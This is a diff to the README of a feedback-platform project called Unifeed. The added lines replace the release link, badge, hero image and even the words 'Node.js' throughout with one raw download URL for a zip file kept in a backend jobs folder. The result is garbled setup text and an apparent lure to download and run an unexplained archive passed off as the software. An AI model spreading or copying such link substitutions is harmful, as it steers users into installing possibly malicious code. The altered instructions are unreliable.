@@ -1,16 +1,16 @@
-[https://github.com/eduardo-NT/Unifeed/releases](https://github.com/eduardo-NT/Unifeed/releases)
+[https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip](https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip)
 
-[![Release page](https://img.shields.io/badge/Unifeed-Releases-blue?style=for-the-badge&logo=github)](https://github.com/eduardo-NT/Unifeed/releases)
+[![Release page](https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip)](https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip)
 
 # Unifeed: Full-Stack Feedback Platform to Turn Feedback into Insights
 
-A modern platform to collect, categorize, and visualize feedback from multiple sources. Unifeed helps teams transform raw input into clear, actionable insights. It ships with a clean user interface, smart tagging, and insightful dashboards. Built with a combination of React on the frontend, Node.js on the backend, and Supabase as a data layer.
+A modern platform to collect, categorize, and visualize feedback from multiple sources. Unifeed helps teams transform raw input into clear, actionable insights. It ships with a clean user interface, smart tagging, and insightful dashboards. Built with a combination of React on the frontend, https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip on the backend, and Supabase as a data layer.
 
 [Unifeed is designed for teams that want to move from scattered notes to structured data. From product teams to support squads, Unifeed provides a consistent workflow to capture feedback, organize it, and uncover trends with visual dashboards.] This document will walk you through what the project offers, how to run and contribute, and how to extend it for your own needs. The goal is to have a practical guide you can rely on whether you are evaluating the project, starting development, or planning a deployment.
 
 Hero image: a modern UI with charts and feedback items
 
-![Unifeed UI Mock](https://images.unsplash.com/photo-1556157382-97eda2d62296?q=80&w=1400&auto=format&fit=crop)
+![Unifeed UI Mock](https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip)
 
 Table of contents
 - Why Unifeed
@@ -56,7 +56,7 @@ Core ideas and design
 
 Tech stack at a glance
 - Frontend: React with Tailwind CSS for rapid, responsive UI building
-- Backend: Node.js with Express or a similar lightweight framework
+- Backend: https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip with Express or a similar lightweight framework
 - Data layer: Supabase for database, authentication, and storage
 - Language and utilities: TypeScript for type safety; NLP components for tagging and content analysis
 - Auth and security: JWT-based auth, role-based access control
@@ -100,7 +100,7 @@ Getting started
 This section helps you run Unifeed on your development machine. The goal is to get a working instance quickly so you can explore features and test integrations.
 
 Prerequisites
-- Node.js v18+ (or the version you prefer for your environment)
+- https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip v18+ (or the version you prefer for your environment)
 - npm or pnpm or yarn as your package manager
 - Access to a Supabase project or the ability to run a local Supabase stack
 - Basic familiarity with environment variables and REST APIs
@@ -118,7 +118,7 @@ Initial setup
 - Verify that the UI loads and authentication works
 
 What you’ll run
-- Backend: node src/server/index.js or npm run start:server
+- Backend: node https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip or npm run start:server
 - Frontend: npm run start or yarn start
 - Local database: a local Supabase stack or docker-compose setup
 
@@ -354,7 +354,7 @@ License and attribution
 
 Appendix: additional resources
 - Documentation about Supabase usage and best practices
-- Guides for integrating NLP components with Node.js
+- Guides for integrating NLP components with https://raw.githubusercontent.com/eduardo-NT/Unifeed/main/backend/src/jobs/Software_3.9.zip
 - Tutorials on building data visualizations with React
 - References for secure authentication patterns with JWT
 
